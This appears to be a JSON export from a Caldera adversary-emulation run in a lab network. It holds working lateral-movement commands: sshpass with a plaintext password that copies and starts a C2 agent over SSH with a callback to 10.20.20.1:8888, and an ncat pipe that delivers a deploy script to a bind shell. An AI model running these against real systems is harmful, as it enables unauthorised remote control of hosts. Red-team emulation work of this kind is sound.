"technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.201.3", "unique": "host.ip.address192.168.201.3", "created": "2023-10-09T20:56:30Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:56:26Z"}, {"deadman": false, "finish": "2023-10-09T20:56:34Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "ca3d261e-2f51-4035-9160-1fb253779eca", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux database@192.168.201.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 database@192.168.201.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-09T20:56:31Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "database", "unique": "host.lateralMove.userdatabase", "created": "2023-10-09T20:56:31Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.201.3", "unique": "host.lateralMove.ip192.168.201.3", "created": "2023-10-09T20:56:31Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "8000", "unique": "host.lateralMove.port8000", "created": "2023-10-09T20:56:31Z", "relationships": []}], "unique": "ca3d261e-2f51-4035-9160-1fb253779eca", "decide": "2023-10-09T20:56:31Z", "status": 1, "score": 15, "pid": "1625", "relationships": [], "host": "activedir-host", "pin": 0, "paw": "jkkxja", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-09T20:56:34Z", "command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux database@192.168.201.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 database@192.168.201.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["1fa187bb-2fdf-4d03-a1b5-57e12789efc9", "ca3d261e-2f51-4035-9160-1fb253779eca"], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.201.3", "unique": "host.ip.address192.168.201.3", "created": "2023-10-09T20:56:30Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:56:34Z"}, {"deadman": false, "finish": null, "executor": {"additional_info": {}, "timeout": 30, "variations": [], "payloads": ["runDeployAgent.sh"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "{ echo \"server=#{server}\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s #{host.lateralMove.ip} #{host.lateralMove.port}", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "a1bf8a15-1c1a-4ec2-b0ef-d9b8fb68fd28", "plaintext_command": "{ echo \"server=http://10.20.20.1:8888\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s 192.168.201.3 4444", "used": [{"trait": "host.lateralMove.ip", "links": [], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.201.3", "unique": "host.lateralMove.ip192.168.201.3", "created": "2023-10-09T20:56:36Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "4444", "unique": "host.lateralMove.port4444", "created": "2023-10-09T20:56:36Z", "relationships": []}], "unique": "a1bf8a15-1c1a-4ec2-b0ef-d9b8fb68fd28", "decide": "2023-10-09T20:56:36Z", "status": -3, "score": 3, "pid": null, "relationships": [], "host": "activedir-host", "pin": 0, "paw": "jkkxja", "output": "False", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ncshell", "executors": [{"additional_info": {}, "timeout": 30, "variations": [], "payloads": ["runDeployAgent.sh"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "{ echo \"server=#{server}\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s #{host.lateralMove.ip} #{host.lateralMove.port}", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T9090", "name": "Deception download agent on target through netcat bind shell", "description": "download sandcat agent on a target machine that is listening on a netcat bind shell", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: Netcat Bind Shell"}, "command": "{ echo \"server=http://10.20.20.1:8888\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s 192.168.201.3 4444", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": null}], "name": "Enterprise Operation", "id": "5540db76-fe98-4943-a62b-7fe3238e5382", "group": "", "jitter": "2/8", "source": {"adjustments": [], "rules": [{"match": ".*", "trait": "file.sensitive.extension", "action": "DENY"}, {"match": "png", "trait": "file.sensitive.extension", "action": "ALLOW"}, {"match": "yml", "trait": "file.sensitive.extension", "action": "ALLOW"}, {"match": "wav", "trait": "file.sensitive.extension", "action": "ALLOW"}], "name": "basic", "id": "ed32b9c3-9593-4c33-b0db-e2007315096b", "plugin": "stockpile", "facts": [{"trait": "file.sensitive.extension", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "file.sensitive.extension", "technique_id": null, "origin_type": "SEEDED", "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "value": "wav", "unique": "file.sensitive.extensionwav", "created": "2023-10-09T20:52:04Z", "relationships": []}, {"trait": "file.sensitive.extension", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "file.sensitive.extension", "technique_id": null, "origin_type": "SEEDED", "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "value": "yml", "unique": "file.sensitive.extensionyml", "created": "2023-10-09T20:52:04Z", "relationships": []}, {"trait": "file.sensitive.extension", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "file.sensitive.extension", "technique_id": null, "origin_type": "SEEDED", "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "value": "png", "unique": "file.sensitive.extensionpng", "created": "2023-10-09T20:52:04Z", "relationships": []}, {"trait": "server.malicious.url", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "server.malicious.url", "technique_id": null, "origin_type": "SEEDED", "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "value": "keyloggedsite.com", "unique": "server.malicious.urlkeyloggedsite.com", "created": "2023-10-09T20:52:04Z", "relationships": []}], "relationships": []}, "obfuscator": "plain-text", "objective": {"percentage": 0.0, "goals": [{"achieved": false, "target": "exhaustion", "operator": "==", "value": "complete", "count": 1048576}], "name": "default", "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc", "description": "This is a default objective that runs forever."}, "visibility": 50, "adversary": {"atomic_ordering": ["deception-nmap", "deception-nmapsubnet", "deception-ssh", "deception-user-add", "deception-user-run-agent", "deception-ncshell", "deception-vsftpd", "deception-whoami", "deception-ls", "deception-pwd", "deception-readfile"], "name": "Deception Enterprise", "plugin": "deception", "description": "This is simple", "adversary_id": "deception_enterprise", "tags": [], "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc", "has_repeatable_abilities": false}}